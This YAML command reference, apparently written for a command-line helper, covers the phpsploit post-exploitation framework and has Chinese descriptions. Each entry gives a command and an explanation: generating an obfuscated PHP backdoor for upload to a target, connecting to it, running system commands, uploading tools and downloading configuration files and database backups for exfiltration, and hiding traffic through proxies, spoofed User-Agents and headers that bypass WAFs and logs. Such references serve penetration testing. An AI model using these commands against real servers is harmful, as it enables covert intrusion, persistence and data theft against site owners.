tool: phpsploit
tags: [web, post-exploitation, php, shell, security, pentest, stealth, backdoor]

actions:
  # === INITIALIZATION & SETUP ===
  - title: phpsploit - 生成隐蔽后门
    desc: |
      生成需要上传到目标服务器的混淆 PHP 后门代码。
      该脚本作为框架的服务器端组件，通过 HTTP 头实现隐蔽通信。
      你可以指定输出路径，将生成的代码直接保存到文件以便后续部署。
    command: "phpsploit -e \"backdoor --output {{output_path|backdoor.php}}\""

  - title: phpsploit - 显示后门代码
    desc: |
      直接在终端中显示 PHP 后门代码而不保存到文件。
      如果你想把代码手动复制粘贴到目标上已有的文件或基于 Web 的文件管理器中，这会很有用。
      生成的代码经过高度混淆，可绕过简单的模式匹配安全方案。
    command: "phpsploit -e \"backdoor\""

  # === CONNECTION & SESSIONS ===
  - title: phpsploit - 连接目标
    desc: |
      与远程服务器上预先部署的 PHP 后门建立交互式连接。
      该命令启动握手过程并打开命令行界面以进行进一步利用。
      确保提供的 URL 是 phpsploit 后门所在的准确路径。
    command: "phpsploit --target {{url}}"

  - title: phpsploit - 加载会话
    desc: |
      从本地文件恢复之前保存的会话。
      这使你能够在不同的工作会话之间保持持久化，而不会丢失配置或目标历史。
      会话包含目标 URL、环境变量以及上次交互期间使用的自定义设置等信息。
    command: "phpsploit --load {{session_file}}"

  - title: phpsploit - 从文件运行命令
    desc: |
      对目标执行存储在本地文本文件中的一系列 phpsploit 命令。
      这非常适合自动化重复性任务，例如初始环境枚举或自动清理。
      使用此标志时默认禁用交互模式，除非强制开启。
    command: "phpsploit --target {{url}} --source {{script_file}}"

  # === POST-EXPLOITATION ACTIONS ===
  - title: phpsploit - 执行系统命令
    desc: |
      通过 PHP 后门在远程服务器上执行原生操作系统命令。
      结果通过混淆通道返回，尽量减少在 Web 服务器访问日志中的痕迹。
      在尝试敏感命令之前，务必先检查当前用户的权限，以避免不必要的检测。
    command: "phpsploit -e \"run {{system_command|id}}\" --target {{url}}"

  - title: phpsploit - 上传文件
    desc: |
      将文件从本地攻击机传输到远程受控服务器。
      这对于部署提权脚本、静态二进制文件或其他后渗透工具至关重要。
      传输通过隐蔽的 HTTP 隧道完成，相比标准 FTP 或 HTTP 上传更难被检测。
    command: "phpsploit -e \"upload {{local_path}} {{remote_path}}\" --target {{url}}"

  - title: phpsploit - 下载文件
    desc: |
      将文件从目标服务器下载到本地机器以进行分析或数据外带。
      可用它获取 Web 根目录下的配置文件、数据库备份或敏感源代码。
      该工具确保通过已建立的混淆介质安全地获取文件内容。
    command: "phpsploit -e \"download {{remote_path}} {{local_path}}\" --target {{url}}"

  - title: phpsploit - 收集系统信息
    desc: |
      收集目标操作系统、PHP 环境和硬件的详细信息。
      这有助于识别潜在的本地提权漏洞并了解环境的限制。
      它提供的数据包括操作系统内核版本、PHP 版本以及被禁用的 PHP 函数列表。
    command: "phpsploit -e \"info\" --target {{url}}"

  # === STEALTH & CONFIGURATION ===
  - title: phpsploit - 通过代理连接
    desc: |
      将 phpsploit 的所有流量经由指定的代理服务器（SOCKS 或 HTTP）路由。
      这对于匿名化你的活动或绕过可能阻止直接出站连接的网络限制至关重要。
      在尝试连接目标之前，确保代理处于活动状态且可访问。
    command: "phpsploit -e \"set proxy {{proxy_url|http://127.0.0.1:8080}}\" --target {{url}}"

  - title: phpsploit - 设置自定义 User-Agent
    desc: |
      更改 phpsploit 使用的 User-Agent 字符串，以伪装成合法的 Web 浏览器。
      自定义此值有助于后门流量在 Web 服务器日志中混入正常用户活动。
      使用常见的浏览器字符串是长期行动中保持隐蔽的标准做法。
    command: "phpsploit -e \"set user-agent {{user_agent|Mozilla/5.0 (Windows NT 10.0; Win64; x64)}}\" --target {{url}}"

  - title: phpsploit - 设置自定义请求头
    desc: |
      为客户端与后门之间的通信添加或修改自定义 HTTP 头。
      可用于绕过某些 WAF 规则，或匹配目标环境所期望的特定流量模式。
      在某些网络配置中，设置诸如 X-Forwarded-For 之类的头也可能很有用。
    command: "phpsploit -e \"set {{header_name|X-Custom-Header}} {{header_value}}\" --target {{url}}"